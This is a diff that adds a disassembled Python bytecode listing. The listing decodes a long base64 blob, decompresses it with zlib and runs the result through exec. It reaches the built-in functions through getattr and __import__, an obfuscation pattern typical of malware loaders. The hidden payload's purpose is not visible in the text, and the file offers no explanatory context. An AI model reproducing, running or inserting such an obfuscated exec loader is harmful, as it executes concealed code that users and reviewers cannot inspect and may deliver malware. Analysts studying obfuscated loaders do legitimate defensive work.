@@ -1,0 +1,28 @@
+  2           0 LOAD_CONST               0 (b'eJzFV11P2zAUfa/U/2Cyl0RjyBWsbGh7GCvdYB0pG6AFxKy0ddugNEH5gEQT/3123CSO7TRt0bRUatPcc298j4+vr53Fgx9EILC9ib9otxz2d2SHuHvQbrVbr8DUtWcd8BFo9OZP6sfoU7CPoq8n6Lv98xIHyOyjoXU4h96zRj3arbFrhyGwJ2dfgstfpnV+1G4Bck3wFCDkeE6EkF5Yh7vAJFf2DY0llF4lYo8CyAjoT50dMjussUPqf+57WG2HZpMdFnZFhqPVGdZkdUouLmoeoIxaIam49/lwT3PHxZyNpbrDonI4ejlTEbgkRomWPChO8ifEKfyERItbTxcCGLIvdkPVUOpCXjeExC5JQpfjNeel8PEmEtUqZ3UEQ5HVWiTVMbUNw1vTAV9MB9yODmmCN6Hjn6nj5XRsqY6mjOr8moWhXHbbruJ1h64oe9eVspfwxKSkXCYC/UlenVOBVTKz7FFNOWTGfG9IuLcUz7KbSsRkVcmUa3taAjKpJdQzqa2dnEV0lmanxMIqNs39kwpJLKVUSbm3BuWmQLmZUw5lyuEqyuF/pRyuS+NKyk0F5XAjypNNOiBShbh2SufQCnDMgxktJUrZCQlNRFwze0vfEie1F1mf9oFDZJ3bqrJSGWysqItNdUkOoGoB83IMJHVtpK0yniCyZeLLAi+lzMtGHUNKklelykVVYLmG0TdYo1rR3AVvX74vJPFHmsb+VPs9WQUheE3QaYRD/bbCLRnm7+UZYo/+OF6kw10Ak37fuDOEAMrxZPSsjcyFH+AoDjwQKpJNS5f7PFm1au65NSKtjzXWxop1QQiVWekYVHBiIVpvSSiU0rwUuEw5rRQ7sEBcT5fouucjj/Ri3y6ezQnA8R7iSNeGLiaHR4C9CAcgmuPs/HgEtMKJcOJibseZG5TT/S6X1kNAqdIugxTYM9vxdjROGWzOZcHOb4/e3tFQ7KCqAT/gjW86zPisbfoi9mTKhxuQbLngqprNcZ3onAj8hW7skrFNSgYGhsG/BdHgBDrDOkw6UL0lVOQtzYcD1IuHSd0Q0Fe0BmQn/r1R92CCx/4E69rhydj9YQ1PzbD3OIitb73hYHjjwLPRwDp+P7rw332+6bn9x6djCx6Ow+5pTh0/J06lA76Smbf8GMz8qBDKfjEDgtKVM0U/Dj1ye/YCI0RfpiG0IGaENFHEParbv5uOKFU=')
+              2 STORE_NAME               0 (code)
+
+  3           4 LOAD_NAME                1 (eval)
+              6 LOAD_CONST               1 ('exec')
+              8 CALL_FUNCTION            1
+
+  4          10 LOAD_NAME                2 (getattr)
+             12 LOAD_NAME                3 (__import__)
+             14 LOAD_CONST               2 ('zlib')
+             16 CALL_FUNCTION            1
+             18 LOAD_CONST               3 ('decompress')
+             20 CALL_FUNCTION            2
+
+  3          22 LOAD_NAME                2 (getattr)
+             24 LOAD_NAME                3 (__import__)
+             26 LOAD_CONST               4 ('base64')
+             28 CALL_FUNCTION            1
+             30 LOAD_CONST               5 ('b64decode')
+             32 CALL_FUNCTION            2
+             34 LOAD_NAME                0 (code)
+             36 CALL_FUNCTION            1
+
+  2          38 CALL_FUNCTION            1
+             40 CALL_FUNCTION            1
+             42 POP_TOP
+             44 LOAD_CONST               6 (None)
+             46 RETURN_VALUE
